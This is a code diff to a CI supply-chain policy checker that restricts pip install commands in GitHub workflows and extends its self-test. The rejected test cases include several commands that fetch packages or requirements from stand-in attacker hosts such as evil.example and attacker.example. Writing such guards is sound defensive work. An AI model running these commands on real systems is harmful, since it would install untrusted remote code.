@@ -119,12 +119,21 @@ def classify(command: str, workflow: str) -> str:
             f"{workflow}: --no-deps is only for reviewed local artifact tests"
         )
     target = targets[0]
-    if set(args) - APPROVED_FLAGS - {"--no-deps", "--no-build-isolation", target}:
-        raise PipInstallPolicyError(f"{workflow}: unsupported local installer arguments")
-    if target == "." and "--no-build-isolation" not in args:
+    # A reviewed, checked-out first-party source may be installed editable only
+    # without dependencies or isolated build fetching. The existing separate
+    # non-editable built-wheel / sdist / release smoke is mandatory and unchanged.
+    # Reject opaque or remote editable sources rather than relying on Scorecard.
+    if target == "." and ("-e" not in args or "--no-build-isolation" not in args):
         raise PipInstallPolicyError(
-            f"{workflow}: local source install requires --no-build-isolation"
+            f"{workflow}: first-party source test requires local editable --no-build-isolation"
         )
+    if target != "." and "-e" in args:
+        raise PipInstallPolicyError(f"{workflow}: artifact smoke must remain noneditable")
+    allowed = APPROVED_FLAGS | {"--no-deps", "--no-build-isolation", target}
+    if target == ".":
+        allowed.add("-e")
+    if set(args) - allowed:
+        raise PipInstallPolicyError(f"{workflow}: unsupported local installer arguments")
     if target.endswith(".tar.gz") and "--no-build-isolation" not in args:
         raise PipInstallPolicyError(
             f"{workflow}: retained sdist install needs --no-build-isolation"
@@ -194,6 +203,12 @@ def self_test() -> None:
         "python -m pip install --require-hashes -r requirements/locks/core-py311.txt --no-deps",
         "python -m pip install --trusted-host attacker.example -r requirements/locks/core-py311.txt",
         "pip install --require-hashes -r requirements/locks/core-py311.txt",
+        "python -m pip install --no-deps --no-build-isolation .",
+        "python -m pip install --no-deps -e .",
+        "python -m pip install --no-deps --no-build-isolation -e https://evil.example/pkg",
+        "python -m pip install --no-deps --no-build-isolation -e git+https://evil.example/pkg",
+        "python -m pip install --no-deps --no-build-isolation -e dist/*.whl",
+        "python -m pip install --no-deps --no-build-isolation dist/*.whl -e",
     )
     for value in bad:
         try:
@@ -208,14 +223,19 @@ def self_test() -> None:
         )
         == "hashed-closure"
     )
-    assert classify("python -m pip install --no-deps --no-build-isolation .", "security.yml") == "."
+    assert classify("python -m pip install --no-deps --no-build-isolation -e .", "security.yml") == "."
+    assert classify("python -m pip install --no-deps dist/*.whl", "ci.yml") == "dist/*.whl"
+    assert (
+        classify("python -m pip install --no-deps --no-build-isolation dist/*.tar.gz", "ci.yml")
+        == "dist/*.tar.gz"
+    )
 
     with tempfile.TemporaryDirectory(prefix="pip-workflow-policy-") as tmp:
         base = Path(tmp)
         target = base / ".github" / "workflows"
         shutil.copytree(ROOT / ".github" / "workflows", target)
         original = (target / "security.yml").read_text(encoding="utf-8")
-        good = "python -m pip install --disable-pip-version-check --no-deps --no-build-isolation ."
+        good = "python -m pip install --disable-pip-version-check --no-deps --no-build-isolation -e ."
         if original.count(good) != 1:
             raise AssertionError("security workflow test fixture changed")
         for replacement in (
@@ -223,6 +243,8 @@ def self_test() -> None:
             "python -m pip install --no-deps flask==3.0.0",
             "python -m pip install --require-hashes -r https://example.org/evil",
             "python -m pip install --require-hashes -r requirements/locks/core-py311.txt",
+            "python -m pip install --disable-pip-version-check --no-deps --no-build-isolation .",
+            "python -m pip install --disable-pip-version-check --no-deps --no-build-isolation -e dist/*.whl",
         ):
             (target / "security.yml").write_text(
                 original.replace(good, replacement), encoding="utf-8"
